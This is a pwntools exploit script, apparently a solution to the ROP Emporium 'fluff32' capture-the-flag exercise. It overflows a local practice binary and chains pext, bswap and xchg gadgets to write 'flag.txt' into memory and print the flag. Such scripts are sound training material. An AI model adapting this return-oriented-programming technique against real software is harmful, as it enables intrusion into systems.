from pwn import *


'''


address print_file()  : 0x80483d0

address .data : 0x804a018

gadget 0 : 0x08048555  xchg   BYTE PTR [ecx] , dl; ret   

gadget 1 : 0x08048558: pop ecx; bswap ecx; ret;

gadget 2 : 
   0x08048543  mov    eax,ebp
   0x08048545  mov    ebx,0xb0bababa
   0x0804854a  pext   edx,ebx,eax
   0x0804854f  mov    eax,0xdeadbeef
   0x08048554  ret 

gadget 3: 0x080485bb pop ebp; ret;

'''

def pext(src1,theMask):
    '''
    my python implementation of pext instruction
    inspired by the pseudo code from https://www.felixcloutier.com/x86/pext

    '''
    temp = f"{src1:#034b}"[2:]
    mask = f"{theMask:#034b}"[2:]
    dest=[ '0' for i in range(32)]
    m=31
    k=31
    print(temp, mask)
    while(m >=0 ):
        if mask[m] == '1':
            
            dest[k]=temp[m] 
            k-=1
        m-=1
    print("".join(dest))
    return int("".join(dest),2)


def bruteforce_pext():
    '''
    this function will bruteforce the mask for the pext instruction with the second operand 
    0xb0bababa in order to return each caracters of "flag.txt"

    '''
    to_send=[0 for i in range(8)]
    word="flag.txt"
    p=0
    for i in word:
        for mask in range(0xffffffff):
            if pext(0xb0bababa, mask ) == ord(i):
                to_send[p]=mask
                p+=1
                break
                
    return to_send
            
 



p=process("./fluff32")

padd=b'A'*44

print_file_addr=p32(0x80483d0)
address_data = 0x804a018
gadget0=p32(0x08048555)
gadget1=p32(0x08048558)
gadget2=p32(0x08048543)
gadget3=p32(0x080485bb)

# bruteforce_pext() returns this array
to_escape_pext =[2891, 733, 7494, 2906, 219, 2765, 6853, 2765]


rop_chain=padd

for i in range(len(to_escape_pext)):
    rop_chain+=gadget3
    rop_chain+=p32(to_escape_pext[i])
    rop_chain+=gadget2
    rop_chain+=gadget1
    rop_chain+=p32(address_data + i , endian='big')  # bswap instruction will transform big endian value into little endian and vice versa
    rop_chain+=gadget0


rop_chain+=print_file_addr
rop_chain+=b'AAAA'
rop_chain+=p32(address_data) # start of .data which now contain "flag.txt"



p.sendlineafter(b'>', rop_chain)

flag=(p.recvall().split(b'\n')[1]).decode()

print(flag)